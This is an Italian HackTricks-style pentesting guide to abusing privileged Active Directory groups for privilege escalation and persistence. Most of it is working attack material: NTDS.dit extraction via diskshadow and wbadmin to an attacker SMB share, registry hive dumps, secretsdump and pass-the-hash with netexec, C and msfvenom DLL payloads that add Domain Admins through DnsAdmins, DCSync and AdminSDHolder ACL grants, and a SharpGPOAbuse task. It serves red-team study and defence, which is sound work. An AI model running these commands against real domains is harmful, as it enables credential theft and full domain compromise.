# Gruppi privilegiati

{{#include ../../banners/hacktricks-training.md}}

## Gruppi noti con privilegi amministrativi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Questo gruppo è autorizzato a creare account e gruppi che non sono amministratori nel dominio. Inoltre, consente l'accesso locale al Domain Controller (DC).

Per identificare i membri di questo gruppo, viene eseguito il seguente comando:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
L'aggiunta di nuovi utenti è consentita, così come l'accesso locale al DC.<sup>[[1]](#references)</sup>

## Gruppo AdminSDHolder

L'Access Control List (ACL) del gruppo **AdminSDHolder** è fondamentale, poiché imposta le autorizzazioni per tutti i "gruppi protetti" all'interno di Active Directory, inclusi i gruppi con privilegi elevati. Questo meccanismo garantisce la sicurezza di tali gruppi impedendo modifiche non autorizzate.

Un attaccante potrebbe sfruttare questa situazione modificando l'ACL del gruppo **AdminSDHolder** e concedendo autorizzazioni complete a un utente standard. In questo modo, l'utente otterrebbe di fatto il controllo completo su tutti i gruppi protetti. Se le autorizzazioni di questo utente venissero modificate o rimosse, verrebbero ripristinate automaticamente entro un'ora a causa del funzionamento del sistema.<sup>[[14]](#references)</sup>

La documentazione recente di Windows Server considera ancora diversi gruppi operatori integrati come oggetti **protetti** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, ecc.). Il processo **SDProp** viene eseguito sul **PDC Emulator** ogni 60 minuti per impostazione predefinita, imposta `adminCount=1` e disabilita l'ereditarietà sugli oggetti protetti. Questo è utile sia per la persistenza sia per individuare utenti con privilegi obsoleti che sono stati rimossi da un gruppo protetto, ma che conservano ancora l'ACL con ereditarietà disabilitata.<sup>[[12]](#references)</sup>

I comandi per esaminare i membri e modificare le autorizzazioni includono:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
È disponibile uno script per accelerare il processo di ripristino: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Per maggiori dettagli, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

L'appartenenza a questo gruppo consente di leggere gli oggetti di Active Directory eliminati, che possono rivelare informazioni sensibili:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Questo è utile per **recuperare precedenti percorsi di privilegi**. Gli oggetti eliminati possono ancora esporre `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, vecchi SPN o il DN di un gruppo privilegiato eliminato, che in seguito può essere ripristinato da un altro operatore.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Accesso al Domain Controller

L'accesso ai file sul DC è limitato, a meno che l'utente non faccia parte del gruppo `Server Operators`, modificando così il livello di accesso.

### Privilege Escalation

Utilizzando `PsService` o `sc` di Sysinternals, è possibile esaminare e modificare le autorizzazioni dei servizi. Il gruppo `Server Operators`, ad esempio, dispone del controllo completo su determinati servizi, consentendo l'esecuzione di comandi arbitrari e la privilege escalation:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Questo comando rivela che `Server Operators` dispone di accesso completo, consentendo la manipolazione dei servizi per ottenere privilegi elevati.

## Backup Operators

L'appartenenza al gruppo `Backup Operators` fornisce accesso al file system di `DC01` grazie ai privilegi `SeBackup` e `SeRestore`. Questi privilegi consentono di attraversare le cartelle, elencarne il contenuto e copiare file, anche senza autorizzazioni esplicite, utilizzando il flag `FILE_FLAG_BACKUP_SEMANTICS`. Per questo processo è necessario utilizzare script specifici.<sup>[[1]](#references)</sup>

Per elencare i membri del gruppo, eseguire:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Attacco locale

Per sfruttare questi privilegi localmente, vengono eseguiti i seguenti passaggi:

1. Importare le librerie necessarie:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Abilitare e verificare `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accedere e copiare file da directory con accesso limitato, ad esempio:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

L'accesso diretto al file system del Domain Controller consente di sottrarre il database `NTDS.dit`, che contiene tutti gli hash NTLM degli utenti e dei computer del dominio.

#### Using diskshadow.exe

1. Crea una shadow copy dell'unità `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copia `NTDS.dit` dalla shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
In alternativa, usa `robocopy` per copiare i file:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Estrai `SYSTEM` e `SAM` per recuperare gli hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recuperare tutti gli hash da `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Dopo l'estrazione: Pass-the-Hash verso DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Using wbadmin.exe

1. Configura il filesystem NTFS per il server SMB sulla macchina dell'attaccante e memorizza nella cache le credenziali SMB sulla macchina target.
2. Usa `wbadmin.exe` per eseguire il backup del sistema e l'estrazione di `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Per una dimostrazione pratica, consulta [VIDEO DIMOSTRATIVO CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

I membri del gruppo **DnsAdmins** possono sfruttare i propri privilegi per caricare una DLL arbitraria con privilegi SYSTEM su un server DNS, spesso ospitato sui Domain Controller. Questa capacità offre un notevole potenziale di exploit.

Per elencare i membri del gruppo DnsAdmins, usa:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Eseguire DLL arbitrarie (CVE‑2021‑40469)

> [!NOTE]
> Questa vulnerabilità consente l'esecuzione di codice arbitrario con privilegi SYSTEM nel servizio DNS (solitamente all'interno dei DC). Il problema è stato risolto nel 2021.

I membri possono fare in modo che il server DNS carichi una DLL arbitraria (localmente oppure da una condivisione remota) utilizzando comandi come:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
È necessario riavviare il servizio DNS (operazione che potrebbe richiedere autorizzazioni aggiuntive) affinché la DLL venga caricata:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Per ulteriori dettagli su questo attack vector, fai riferimento a ired.team.

#### Mimilib.dll

È anche possibile usare mimilib.dll per l'esecuzione di comandi, modificandolo per eseguire comandi specifici o reverse shell. [Consulta questo post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) per ulteriori informazioni.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

I DnsAdmins possono manipolare i record DNS per eseguire attacchi Man-in-the-Middle (MitM), creando un record WPAD dopo aver disabilitato la global query block list. Strumenti come Responder o Inveigh possono essere usati per lo spoofing e la cattura del traffico di rete.

### Event Log Readers
I membri possono accedere ai log degli eventi, trovando potenzialmente informazioni sensibili come password in plaintext o dettagli sull'esecuzione dei comandi:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Questo gruppo può modificare le DACL sull'oggetto di dominio, concedendo potenzialmente privilegi DCSync. Le tecniche per la privilege escalation che sfruttano questo gruppo sono descritte nel repository GitHub Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Se puoi agire come membro di questo gruppo, l'abuso classico consiste nel concedere a un principal controllato dall'attaccante i diritti di replica necessari per [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Storicamente, **PrivExchange** concatenava l'accesso alle mailbox, l'autenticazione Exchange forzata e LDAP relay per ottenere questa stessa primitiva. Anche quando quel percorso di relay è mitigato, l'appartenenza diretta a `Exchange Windows Permissions` o il controllo di un server Exchange rimane un percorso di alto valore verso i diritti di replicazione del dominio.

## Hyper-V Administrators

Hyper-V Administrators dispongono di accesso completo a Hyper-V, che può essere sfruttato per ottenere il controllo dei Domain Controller virtualizzati. Ciò include la clonazione di DC attivi e l'estrazione degli hash NTLM dal file `NTDS.dit`.

### Esempio di exploitation

L'abuso pratico consiste solitamente nell'**accesso offline ai dischi/checkpoint dei DC**, piuttosto che nei vecchi trucchi di LPE a livello host. Con accesso all'host Hyper-V, un operatore può creare un checkpoint o esportare un Domain Controller virtualizzato, montare il VHDX ed estrarre `NTDS.dit`, `SYSTEM` e altri secret senza interagire con LSASS all'interno del guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Da lì, riutilizza il workflow di `Backup Operators` per copiare offline `Windows\NTDS\ntds.dit` e gli hive del registro. Workflow correlato per i backup:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners

Questo gruppo consente ai membri di creare Group Policies nel dominio. Tuttavia, i suoi membri non possono applicare Group Policies a utenti o gruppi, né modificare GPO esistenti.

La sfumatura importante è che il **creator diventa il proprietario della nuova GPO** e generalmente ottiene diritti sufficienti per modificarla in seguito. Ciò significa che questo gruppo è interessante quando puoi:

- creare una GPO malevola e convincere un amministratore a collegarla a una OU o a un dominio target
- modificare una GPO creata da te che è già collegata in un punto utile
- abusare di un altro diritto delegato che consenta di collegare GPO, mentre questo gruppo ti fornisce i diritti di modifica

L'abuso pratico consiste normalmente nell'aggiungere un **Immediate Task**, uno **startup script**, l'appartenenza al gruppo degli amministratori locali o una modifica all'assegnazione dei diritti utente tramite file di policy supportati da SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Se modifichi manualmente la GPO tramite `SYSVOL`, ricorda che la modifica da sola non è sufficiente: è necessario aggiornare anche `versionNumber`, `GPT.ini` e, talvolta, `gPCMachineExtensionNames`, altrimenti i client ignoreranno l'aggiornamento dei criteri.<sup>[[9]](#references)</sup>

## Organization Management

Negli ambienti in cui è distribuito **Microsoft Exchange**, un gruppo speciale noto come **Organization Management** dispone di capacità significative. Questo gruppo dispone dei privilegi necessari per **accedere alle mailbox di tutti gli utenti del dominio** e mantiene il **controllo completo sull'Unità Organizzativa (OU) 'Microsoft Exchange Security Groups'**. Questo controllo include il gruppo **`Exchange Windows Permissions`**, che può essere sfruttato per una privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

I membri del gruppo **Print Operators** dispongono di diversi privilegi, tra cui **`SeLoadDriverPrivilege`**, che consente loro di **effettuare il logon localmente su un Domain Controller**, arrestarlo e gestire le stampanti. Per sfruttare questi privilegi, soprattutto se **`SeLoadDriverPrivilege`** non è visibile in un contesto non elevato, è necessario bypassare User Account Control (UAC).<sup>[[1]](#references)</sup>

Per elencare i membri di questo gruppo, si utilizza il seguente comando PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Sui Domain Controllers questo gruppo è pericoloso perché la policy predefinita dei Domain Controller assegna **`SeLoadDriverPrivilege`** a `Print Operators`. Se ottieni un token elevato per un membro di questo gruppo, puoi abilitare il privilegio e caricare un driver firmato ma vulnerabile per passare al kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Per i dettagli sulla gestione dei token, consulta [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Ai membri di questo gruppo viene concesso l'accesso ai PC tramite Remote Desktop Protocol (RDP). Per enumerare questi membri, sono disponibili comandi PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Ulteriori approfondimenti sullo sfruttamento di RDP sono disponibili in risorse dedicate al pentesting.

#### Remote Management Users

I membri possono accedere ai PC tramite **Windows Remote Management (WinRM)**. L'enumerazione di questi membri viene eseguita tramite:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Per le tecniche di exploitation relative a **WinRM**, è necessario consultare la documentazione specifica.

#### Server Operators

Questo gruppo dispone delle autorizzazioni per eseguire varie configurazioni sui Domain Controller, inclusi i privilegi di backup e ripristino, la modifica dell’ora di sistema e l’arresto del sistema.<sup>[[1]](#references)</sup> Per enumerarne i membri, utilizzare il comando seguente:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Nei Domain Controllers, `Server Operators` ereditano comunemente diritti sufficienti per **riconfigurare o avviare/arrestare servizi** e ricevono anche `SeBackupPrivilege`/`SeRestorePrivilege` tramite la policy predefinita del DC. In pratica, questo li rende un ponte tra **service-control abuse** ed **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Se un ACL del servizio concede a questo gruppo i diritti di modifica/avvio, indirizza il servizio verso un comando arbitrario, avvialo come `LocalSystem`, quindi ripristina il `binPath` originale. Se il controllo dei servizi è limitato, ricorri alle tecniche di `Backup Operators` descritte sopra per copiare `NTDS.dit`.

## References

- [1] [ired.team – Account privilegiati e privilegi dei token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusare di SeLoadDriverPrivilege per l'escalation dei privilegi](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusare delle autorizzazioni GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Abuso delle GPO, parte 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Una guida di un Red Teamer a GPO e OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Funzione ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP anonimo → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendice C: account e gruppi protetti in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Come abusare di AdminSDHolder e creare una backdoor per ottenere persistenza come Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusare del privilegio DnsAdmins per l'escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informazioni sull'abuso dell'edge GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Funzione NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
